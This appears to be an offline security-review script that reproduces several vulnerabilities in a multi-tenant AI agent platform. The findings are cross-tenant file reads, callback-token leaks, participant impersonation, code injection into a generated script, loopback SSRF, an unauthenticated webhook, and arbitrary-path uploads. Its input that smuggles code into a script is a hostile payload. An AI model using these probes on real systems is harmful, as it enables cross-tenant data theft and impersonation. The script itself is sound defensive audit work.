"""Offline security probes: synthetic files/data only, no external HTTP requests.

Run with the review virtualenv Python from the repository root.
AST extraction avoids importing application startup and configured integrations.
"""
import ast
import asyncio
import importlib.util
import json
import logging
import os
import tempfile
import uuid
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

import httpx
from fastapi import Depends, Header
from starlette.responses import JSONResponse

ROOT = Path(__file__).resolve().parents[3]


def load_file(name, path):
    spec = importlib.util.spec_from_file_location(name, ROOT / path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def functions(path, names, namespace):
    tree = ast.parse((ROOT / path).read_text())
    selected = []
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name in names:
            node.decorator_list = []
            selected.append(node)
    module = ast.Module(body=[ast.ImportFrom(module="__future__", names=[ast.alias(name="annotations")], level=0), *selected], type_ignores=[])
    exec(compile(ast.fix_missing_locations(module), path, "exec"), namespace)
    return namespace


async def main():
    results = {}
    command = load_file("review_commands", "api/src/services/agents/internal_tools/command_tools.py")
    with tempfile.TemporaryDirectory(prefix="synkora-isolation-") as tmp:
        with patch.dict(os.environ, {"APP_ENV": "test", "SANDBOX_API_KEY": "synthetic-review-key", "WORKSPACES_BASE": tmp}):
            sandbox = load_file("review_sandbox", "services/sandbox/app.py")
        victim = Path(tmp) / "tenant-b" / "agent-b" / "marker.txt"
        victim.parent.mkdir(parents=True)
        victim.write_text("SYNTHETIC_VICTIM_MARKER")
        argv = ["cat", str(victim)]
        results["remote_allowlist_accepts_foreign_file"] = command._is_command_safe(argv, None, skip_path_validation=True)
        response = await sandbox.exec_command(sandbox.ExecRequest(tenant_id="tenant-a", agent_id="agent-a", command=argv), "synthetic-review-key")
        results["sandbox_reads_foreign_tenant_marker"] = response.get("output") == "SYNTHETIC_VICTIM_MARKER"

    namespace = functions("api/src/controllers/agents/war_room.py", {"_session_to_schema", "_respond_internal", "_generate_agent_script"}, {"uuid": uuid, "datetime": datetime, "UTC": UTC})
    session = SimpleNamespace(id=uuid.uuid4(), topic="Synthetic debate", debate_type="structured", rounds=3, current_round=1, status="active", is_public=True, allow_external=True, share_token="synthetic-share", participants=[{"id": "synthetic-participant", "agent_name": "Victim", "is_external": True, "auth_token": "SYNTHETIC_CALLBACK_SECRET"}], messages=[], debate_metadata={}, verdict=None, created_at=None, completed_at=None)
    public_data = namespace["_session_to_schema"](session)
    results["public_serializer_exposes_callback_token"] = public_data["participants"][0]["auth_token"] == "SYNTHETIC_CALLBACK_SECRET"
    db = SimpleNamespace(commit=AsyncMock())
    request = SimpleNamespace(participant_id=public_data["participants"][0]["id"], round=1, content="Synthetic impersonated response")
    response = await namespace["_respond_internal"](session, request, db)
    results["public_participant_id_suffices_to_impersonate"] = response["status"] == "accepted"
    script = namespace["_generate_agent_script"]("https://example.invalid", "synthetic-share", '"; REVIEW_INJECTION_MARKER = True; #', "anthropic", "example-model", "Synthetic topic")
    tree = ast.parse(script)
    results["downloaded_script_injects_top_level_python"] = any(isinstance(node, ast.Assign) and any(isinstance(target, ast.Name) and target.id == "REVIEW_INJECTION_MARKER" for target in node.targets) for node in tree.body)

    captured = []
    async def capture(request):
        captured.append(str(request.url))
        return httpx.Response(200, json={"content": "SYNTHETIC_INTERNAL_RESPONSE"})
    real_client = httpx.AsyncClient
    fake_httpx = SimpleNamespace(AsyncClient=lambda **kwargs: real_client(transport=httpx.MockTransport(capture), **kwargs), TimeoutException=httpx.TimeoutException)
    callback = functions("api/src/services/agents/workflows/debate_executor.py", {"_call_external_callback"}, {"httpx": fake_httpx, "EXTERNAL_AGENT_TIMEOUT": 1, "logger": logging.getLogger("review")})["_call_external_callback"]
    response = await callback(None, "http://127.0.0.1:5001/internal-review-marker", None, "Synthetic topic", 1, 3, "Synthetic context")
    results["callback_dispatches_loopback_and_returns_response"] = bool(captured) and response == "SYNTHETIC_INTERNAL_RESPONSE"

    provider = SimpleNamespace(handle_webhook=AsyncMock(return_value={"synthetic": True}), verify_signature=AsyncMock())
    webhook = functions("api/src/controllers/phone_calls.py", {"vapi_webhook"}, {"Depends": Depends, "Header": Header, "get_async_db": lambda: None, "get_call_provider": lambda name: provider, "JSONResponse": JSONResponse})["vapi_webhook"]
    await webhook(SimpleNamespace(body=AsyncMock(return_value=b'{"message":{"type":"call-started"}}'), headers={}), db=SimpleNamespace(), x_vapi_secret=None)
    results["phone_webhook_without_secret_reaches_handler"] = provider.handle_webhook.await_count == 1 and provider.verify_signature.call_count == 0

    resolve = functions("api/src/services/agents/tool_registrations/browser_tools_registry.py", {"_resolve_session_id"}, {"uuid": uuid})["_resolve_session_id"]
    a = SimpleNamespace(tenant_id=uuid.uuid4(), conversation_id=uuid.uuid4())
    b = SimpleNamespace(tenant_id=uuid.uuid4(), conversation_id=uuid.uuid4())
    results["browser_explicit_session_collides_across_tenants"] = resolve({"session_id": "shared-review-session"}, a) == resolve({"session_id": "shared-review-session"}, b)

    locator = SimpleNamespace(set_input_files=AsyncMock())
    upload = functions("services/scraper/app.py", {"browser_upload_file"}, {"_get_session_and_page": AsyncMock(return_value=(SimpleNamespace(get_page_state=lambda page: None), object())), "normalize_timeout": lambda value: 1000, "_resolve_locator": lambda *args: locator})["browser_upload_file"]
    await upload(SimpleNamespace(session_id="synthetic", page_id=None, timeout_ms=None, file_ref="input[type=file]", file_paths=["/outside-workspace/synthetic-marker.txt"]))
    results["browser_upload_passes_arbitrary_server_path"] = locator.set_input_files.await_args.args[0] == ["/outside-workspace/synthetic-marker.txt"]
    print(json.dumps(results, indent=2))
    assert all(results.values()), "One or more findings no longer reproduce"


if __name__ == "__main__":
    asyncio.run(main())
